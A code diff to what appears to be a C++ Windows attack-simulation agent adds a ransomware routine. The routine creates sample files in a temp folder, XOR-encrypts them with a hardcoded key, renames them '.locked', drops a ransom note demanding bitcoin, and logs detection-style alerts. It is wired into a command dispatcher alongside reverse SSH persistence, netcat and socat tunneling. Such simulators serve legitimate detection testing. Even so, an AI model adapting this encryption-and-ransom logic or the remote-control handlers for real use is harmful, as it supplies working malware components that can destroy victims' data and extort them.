@@ -2090,7 +2090,86 @@ public:
         
         sendResponse("SSH:REVERSE:ESTABLISHED:PERSISTENCE_ENABLED");
     }
-    
+
+    void executeRansomware() {
+        sendResponse("RANSOMWARE:STARTING");
+
+        std::string baseDir = "C:\\temp\\ranom";
+        CreateDirectoryA("C:\\temp", NULL);
+        CreateDirectoryA(baseDir.c_str(), NULL);
+
+        // Count existing files in directory
+        WIN32_FIND_DATAA fdata;
+        HANDLE hFind = FindFirstFileA((baseDir + "\\*").c_str(), &fdata);
+        int count = 0;
+        if (hFind != INVALID_HANDLE_VALUE) {
+            do {
+                if (!(fdata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) count++;
+            } while (FindNextFileA(hFind, &fdata));
+            FindClose(hFind);
+        }
+
+        // Create sample files if fewer than 50 exist
+        if (count < 50) {
+            std::vector<std::string> exts = {"txt","doc","xls","ppt","pdf","jpg","png","csv","html","xml"};
+            for (int i = count; i < 50; ++i) {
+                std::string path = baseDir + "\\sample_" + std::to_string(i) + "." + exts[i % exts.size()];
+                std::ofstream f(path, std::ios::binary);
+                if (f.is_open()) {
+                    f << "Sample data " << i;
+                    f.close();
+                }
+            }
+        }
+
+        const std::string key = "PANRansomKey";
+        hFind = FindFirstFileA((baseDir + "\\*").c_str(), &fdata);
+        if (hFind == INVALID_HANDLE_VALUE) {
+            sendResponse("RANSOMWARE:NO_FILES");
+            return;
+        }
+
+        do {
+            if (!(fdata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
+                std::string filePath = baseDir + "\\" + fdata.cFileName;
+
+                std::ifstream in(filePath, std::ios::binary);
+                std::vector<char> data((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
+                in.close();
+
+                for (size_t i = 0; i < data.size(); ++i)
+                    data[i] ^= key[i % key.size()];
+
+                std::ofstream out(filePath, std::ios::binary | std::ios::trunc);
+                out.write(data.data(), data.size());
+                out.close();
+
+                std::string newPath = filePath + ".locked";
+                MoveFileA(filePath.c_str(), newPath.c_str());
+
+                std::string md5 = getFileHash(newPath, "MD5");
+                std::string sha256 = getFileHash(newPath, "SHA256");
+                std::string logMsg = "file=" + std::string(fdata.cFileName) +
+                    " path=" + newPath + " md5=" + md5 + " sha256=" + sha256 +
+                    " user=" + username + " pid=" + std::to_string(GetCurrentProcessId());
+                logActivity("*** XDR_ALERT ***", "RANSOMWARE_FILE_ENCRYPTED", logMsg);
+            }
+        } while (FindNextFileA(hFind, &fdata));
+        FindClose(hFind);
+
+        // Drop ransom note
+        std::string notePath = baseDir + "\\README_RESTORE_FILES.txt";
+        std::ofstream note(notePath);
+        if (note.is_open()) {
+            note << "All your files have been encrypted.\n";
+            note << "Send 5 BTC to 1FakeBitcoinAddress to restore them.";
+            note.close();
+        }
+        logActivity("*** XDR_ALERT ***", "RANSOMWARE_NOTE_DROPPED", "Note placed at " + notePath);
+
+        sendResponse("RANSOMWARE:COMPLETE");
+    }
+
     void executeNetcatTunnel() {
         sendResponse("NETCAT:STARTING");
         
@@ -2781,19 +2860,23 @@ public:
             case CMD_TOR_API_CALL:
                 executeTorApiCall();
                 break;
-                
+
             case CMD_REVERSE_SSH:
                 executeReverseSSH();
                 break;
-                
+
             case CMD_NETCAT_TUNNEL:
                 executeNetcatTunnel();
                 break;
-                
+
             case CMD_SOCAT_RELAY:
                 executeSocatRelay();
                 break;
-                
+
+            case CMD_RANSOMWARE:
+                executeRansomware();
+                break;
+
             case CMD_REMOTE_DESKTOP:
                 executeRemoteDesktop();
                 break;
